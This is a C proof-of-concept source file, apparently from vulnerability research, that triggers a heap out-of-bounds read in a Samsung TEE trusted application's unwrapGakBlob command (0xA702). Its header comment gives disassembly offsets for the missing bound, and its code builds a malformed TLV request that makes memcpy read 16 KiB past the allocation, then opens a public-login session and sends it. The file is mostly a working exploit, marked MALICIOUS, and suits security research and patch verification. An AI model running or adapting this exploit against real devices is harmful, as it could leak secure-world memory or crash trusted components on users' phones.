// PRVTEE-3 dynamic repro (MALICIOUS) — cmd 42754 (0xA702 unwrapGakBlob) heap OOB READ.
// Drives the SHIPPING S921BXXSFDZE1 PRVTEE binary in TA_GP_emulator
// (staged byte-identical, sha256 fe4ef15f67d93697...).
//
// PRIMITIVE (verified byte-exact from raw-ELF DISASM, see repro/PRVTEE-3/verify_*):
//   prvtee_unwrapGakBlob @0x187EC parses the tag-15 TLV value (req_tlv,req_len):
//     req_tlv[0]==2 ; *(u16)(req_tlv+1)==16(IV len) ; IV@[3..18] ;
//     req_tlv[19]==6 ; blob_len = *(u16)(req_tlv+20) ;
//     0x188dc CMP blob_len,#0x4000 / B.LS  -> DEST-only bound (s is 0x4000)
//     0x189d8 ADD X1,req_tlv,#0x16 (src=req_tlv+22) / MOV X2,blob_len / BL memcpy
//   req_len (the tag-15 record length) is checked NON-ZERO only (0x188a0 CBZ),
//   then the register is OVERWRITTEN by blob_len (0x188d8) -> there is NO
//   `22+blob_len <= req_len` source bound  => OOB read of the source.
//
// DISPATCH (byte-exact): TA_InvokeCommandEntryPoint @0x1A614 requires
//   param_types&0xF==7 (MEMREF_INOUT); wire = [u32 cmd][u32 payload_len][payload];
//   snapshot v11 = TEE_Malloc(v8=0x7FF8); single-fetch copy of payload_len bytes;
//   prvtee_taCmdExecute dispatches cmd 0xA702 -> tlvGet(v11,len,/*tag*/15,...) ->
//   unwrapGakBlob(req_tlv=out_ptr, req_len=out_len). NO caller/UUID gate.
//
// TLV WIRE (from tlvGet @0x23F40): outer = [0]=0xFE [1..2]=total_len(u16 LE),
//   then records [u8 tag][u16 len LE][value]; total_len+3<=payload_len, and the
//   found record enforces val_off+rec_len<=total_len+3 (tlvGet is source-bounded).
//
// MALICIOUS LAYOUT: fill the snapshot (payload_len=0x7FF8), place the tag-15
//   record at the very END so req_tlv+22 == v11+0x7FF8 (the allocation end), with
//   req_len=22 and blob_len=0x4000  =>  memcpy reads v11[0x7FF8 .. 0xBFF8) =
//   0x4000 (16 KiB) past the 0x7FF8-byte TEE_Malloc chunk -> trailing asan
//   redzone -> out-of-bound read / CRASH_PC. (lr should be base+0x189e8, the
//   instruction after the cited `bl memcpy` @0x189e4.)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
void (*TEEC_ReleaseSharedMemory_impl)(TEEC_SharedMemory*);

#define CMD_UNWRAP_GAK_BLOB 0xA702u
#define V8        0x7FF8u          /* snapshot size = TEE_Malloc(0x7FF8) (creator_table[0x18]) */
#define REQ_SZ    0x8100           /* >= 8 + payload_len (0x7FF8) */
#define MEMREF_SZ 0x8000u          /* memref.size seen by the TA (>= payload_len+8 = 0x8000) */
#define BLOB_LEN  0x4000u          /* max admitted by the dest bound; full 16 KiB over-read */

/* Build the malicious request into buf; returns total wire size. */
static uint32_t build_malicious(uint8_t *buf)
{
    uint32_t cmd = CMD_UNWRAP_GAK_BLOB;
    uint32_t payload_len = V8;             /* fill the whole snapshot */
    uint8_t *p = buf + 8;                  /* payload = snapshot content */
    memset(p, 0x41, payload_len);          /* filler region content (skipped by tlvGet) */

    /* outer Samsung-TLV header */
    p[0] = 0xFE;
    uint16_t total_len = (uint16_t)(payload_len - 3);   /* 0x7FF5 ; total_len+3 == payload_len */
    p[1] = total_len & 0xFF; p[2] = (total_len >> 8) & 0xFF;

    /* one filler record [tag=1][len=fl][value]; cursor 3 -> 0x7FDF (=> fl=0x7FDF-6) */
    uint16_t fl = (uint16_t)(0x7FDF - 6);  /* 0x7FD9 */
    p[3] = 0x01; p[4] = fl & 0xFF; p[5] = (fl >> 8) & 0xFF;
    /* p[6 .. 6+fl) value already 0x41 */

    /* tag-15 record header @ 0x7FDF : [0x0F][rec_len=22 LE] */
    uint32_t r = 0x7FDF;
    p[r+0] = 0x0F;
    p[r+1] = 22; p[r+2] = 0;               /* req_len = 22 (header only, no in-record blob) */

    /* inner struct (req_tlv) @ 0x7FE2 — exactly 22 bytes, ending at 0x7FF8 */
    uint8_t *iv = p + r + 3;               /* = p + 0x7FE2 */
    iv[0]  = 0x02;                         /* inner tag */
    iv[1]  = 0x10; iv[2] = 0x00;           /* IV length == 16 */
    memset(iv + 3, 0x00, 16);             /* IV [3..18] */
    iv[19] = 0x06;                         /* blob tag */
    iv[20] = BLOB_LEN & 0xFF; iv[21] = (BLOB_LEN >> 8) & 0xFF;  /* blob_len = 0x4000 */
    /* iv+22 == p + 0x7FF8 == v11 + 0x7FF8 == END of the snapshot allocation */

    memcpy(buf + 0, &cmd, 4);
    memcpy(buf + 4, &payload_len, 4);
    return 8 + payload_len;                /* 0x8000 */
}

int main(void)
{
    char *ta = "00000000-0000-0000-0000-505256544545";
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin = 0;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;

    load_functions();
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[poc] session opened to prvtee (PUBLIC login)\n");

    uint8_t *req = malloc(REQ_SZ);
    memset(req, 0, REQ_SZ);
    uint32_t total = build_malicious(req);
    printf("[poc] MALICIOUS: payload_len=0x%x, tag-15 rec @0x7FDF, req_len=22, blob_len=0x%x\n",
           V8, BLOB_LEN);
    printf("[poc] -> memcpy src = v11+0x%x (alloc end), len 0x%x => reads up to v11+0x%x"
           " (0x%x B past the 0x%x chunk)\n",
           V8, BLOB_LEN, V8 + BLOB_LEN, BLOB_LEN, V8);

    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_NONE, TEEC_NONE, TEEC_NONE); /* 0x7 */
    op.params[0].tmpref.buffer = req;
    op.params[0].tmpref.size   = MEMREF_SZ;

    printf("[poc] InvokeCommand cmd=0x%x paramTypes=0x%lx total wire=0x%x\n",
           CMD_UNWRAP_GAK_BLOB, (unsigned long)op.paramTypes, total);
    res = TEEC_InvokeCommand_impl(&session, CMD_UNWRAP_GAK_BLOB, &op, &err_origin);
    printf("[poc] cmd 0x%x returned res=0x%x origin=0x%x\n", CMD_UNWRAP_GAK_BLOB, res, err_origin);

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    printf("[+] done\n");
    return 0;
}
